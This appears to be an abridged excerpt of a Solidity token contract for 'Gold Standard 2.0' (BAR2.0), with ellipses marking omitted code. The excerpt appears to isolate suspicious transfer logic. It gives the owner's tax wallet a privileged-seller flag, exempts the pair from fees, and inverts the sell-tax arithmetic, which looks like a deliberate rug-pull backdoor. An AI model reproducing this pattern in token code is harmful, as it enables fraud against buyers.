...
/*
What is Bonding Curve Deflation you ask? Good Question! BAR2.0!

TG :   https://t.me/bar2_eth
WEB: www.goldstandard2.xyz
X:     https://x.com/bar2_eth
 */
...
contract BAR2 is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Gold Standard 2.0";
    string private constant _symbol = unicode"BAR2.0";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (to == uniswapV2Pair && from != address(this) && automaticMarketPair[from]) {
                uint256 taxAmount = amount.sub(amount.mul(_finalSellTax).div(100));
    ...
    function openBar2() external onlyOwner {
        ...
        automaticMarketPair[_taxWallet] = true;
        _isExcludedFromFee[address(uniswapV2Pair)] = true;
